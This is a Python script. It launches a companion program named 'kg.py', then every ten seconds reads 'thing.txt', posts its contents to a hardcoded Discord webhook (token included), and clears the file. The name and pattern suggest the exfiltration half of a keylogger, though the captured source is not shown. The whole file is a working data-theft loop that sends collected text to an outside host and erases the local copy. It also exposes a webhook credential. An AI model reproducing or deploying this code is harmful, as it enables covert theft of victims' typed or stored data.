import requests
import time
import logging
import os
import asyncio

async def run_script():
    proc = await asyncio.create_subprocess_exec(
        'python', 'kg.py',
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await proc.communicate()
    print(stdout.decode())
    if stderr:
        print('Error:', stderr.decode())

asyncio.run(run_script())

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1378954504040484894/PMBgXVTCEhC5Reh0s4KSzoWShbRx3simerCbhsmml11ToQh2YwRWTaJRnu8TyKttYIRo"
FILE_PATH = "thing.txt"  # Path to the file to read
INTERVAL_SECONDS = 10  # Time interval in seconds
DISCORD_MAX_LENGTH = 2000  # Discord's max message length

def read_file_contents(file_path):
    """Read the contents of the specified file."""
    try:
        if not os.path.exists(file_path):
            logger.warning(f"File {file_path} does not exist.")
            return ""
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read().strip()
        return content
    except Exception as e:
        logger.error(f"Error reading file {file_path}: {e}")
        return ""

def clear_file_contents(file_path):
    """Clear the contents of the specified file."""
    try:
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write("")
        logger.info(f"Cleared contents of {file_path}")
    except Exception as e:
        logger.error(f"Error clearing file {file_path}: {e}")

def split_content(content, max_length):
    """Split content into chunks of max_length, preserving line breaks where possible."""
    if len(content) <= max_length:
        return [content] if content else []
    
    chunks = []
    current_chunk = ""
    lines = content.splitlines()
    
    for line in lines:
        # If a single line is too long, split it
        while len(line) > max_length:
            chunks.append(line[:max_length])
            line = line[max_length:]
        # Add line to current chunk
        if len(current_chunk) + len(line) + 1 <= max_length:
            current_chunk += (line + "\n") if line else "\n"
        else:
            # Current chunk is full, save it and start a new one
            if current_chunk:
                chunks.append(current_chunk.rstrip("\n"))
            current_chunk = (line + "\n") if line else "\n"
    
    # Add the last chunk if it exists
    if current_chunk:
        chunks.append(current_chunk.rstrip("\n"))
    
    return chunks

def send_to_discord(content):
    """Send content to Discord webhook, splitting if necessary."""
    if not content:
        logger.info("No content to send to Discord.")
        return
    
    # Split content into chunks
    chunks = split_content(content, DISCORD_MAX_LENGTH)
    if not chunks:
        logger.info("No valid chunks to send to Discord.")
        return
    
    for i, chunk in enumerate(chunks, 1):
        payload = {"content": chunk}
        try:
            response = requests.post(WEBHOOK_URL, json=payload)
            if response.status_code == 204:
                logger.info(f"Message {i}/{len(chunks)} sent successfully to Discord.")
            else:
                logger.error(f"Failed to send message {i}/{len(chunks)}. Status code: {response.status_code}, Response: {response.text}")
            # Respect Discord rate limits (avoid hitting 30 requests/minute)
            time.sleep(1)  # Small delay between messages
        except Exception as e:
            logger.error(f"Error sending message {i}/{len(chunks)} to Discord: {e}")

def main():
    """Main loop to read, send, and clear file contents every X seconds."""
    if not WEBHOOK_URL.startswith("https://discord.com/api/webhooks/"):
        logger.error("Invalid Discord webhook URL. Please provide a valid URL.")
        return
    while True:
        try:
            # Read file contents
            content = read_file_contents(FILE_PATH)
            # Send to Discord if content exists
            if content:
                send_to_discord(content)
                # Clear file contents after sending
                clear_file_contents(FILE_PATH)
            else:
                logger.info(f"No content in {FILE_PATH} to send.")
            # Wait for the specified interval
            time.sleep(INTERVAL_SECONDS)
        except KeyboardInterrupt:
            logger.info("Script stopped by user.")
            break
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            time.sleep(INTERVAL_SECONDS)  # Continue after error to avoid rapid looping

if __name__ == "__main__":
    main()